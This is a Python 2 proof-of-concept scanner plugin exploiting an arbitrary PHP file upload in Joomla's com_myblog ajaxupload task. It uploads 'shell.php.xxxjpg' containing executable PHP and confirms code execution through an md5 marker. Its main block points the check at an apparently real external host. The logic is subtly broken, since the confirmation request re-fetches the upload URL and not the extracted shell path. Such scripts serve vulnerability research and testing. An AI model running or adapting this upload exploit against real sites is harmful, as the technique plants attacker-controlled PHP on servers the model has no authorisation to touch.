from ..miniCurl import Curl
from ..t  import T
#!/usr/bin/env python
#-*- encoding:utf-8 -*-
#__author__ = '1c3z'
#ref https://www.youtube.com/watch?v=Rk6di9REaM8

import random
import re

class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        arg='http://'+ip+':'+port+'/'
        curl=Curl()
        result = {}
        result['result']=False

        raw = '''POST /index.php?option=com_myblog&task=ajaxupload HTTP/1.1
    Host: www.baidu.com
    Accept: */*
    Content-Length: 235
    Content-Type: multipart/form-data; boundary=------------------------672e7d0b915bbd1b
    
    --------------------------672e7d0b915bbd1b
    Content-Disposition: form-data; name="fileToUpload"; filename="shell.php.xxxjpg"
    Content-Type: application/octet-stream
    
    <?php echo md5(0x22);unlink(__FILE__);?>
    --------------------------672e7d0b915bbd1b'''
        url = arg + '/index.php?option=com_myblog&task=ajaxupload'
        code, head,res, errcode, _ = curl.curl2(url, raw=raw)
    
        if 'shell.php.xxxjpg' in res:
            shell = re.findall(r"source: '(.+)'", res)
            if shell:
                code, head,res, errcode, _ = curl.curl2(url)
                if 'e369853df766fa44e1ed0ff613f563bd' in res:
                    output(shell[0],result,'hole')
                    

        del curl
        return result


def output(url,result,label):
    info = url + '  joomla  Vul '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='joomla Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/thirdparty/joomla/joomla_8aa9e202a644f5bf72f62697dc5cffe8.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == '__main__':
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/joomla/joomla_8aa9e202a644f5bf72f62697dc5cffe8.py
#/root/github/poccreate/codesrc/exp-1144.py